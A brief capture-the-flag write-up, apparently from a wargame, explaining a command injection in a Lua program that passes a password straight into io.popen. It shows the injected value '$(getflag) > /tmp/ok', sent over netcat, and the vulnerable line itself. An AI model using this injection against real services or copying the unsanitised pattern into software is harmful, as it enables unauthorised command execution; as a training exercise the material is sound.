We can see in the main program
> prog = io.popen("echo "..pass.." | sha1sum", "r")

using `netcat 0.0.0.0 5151`

We can exploit this to actually execute a command for us

`$(getflag) > /tmp/ok`

then `cat /tmp/ok`
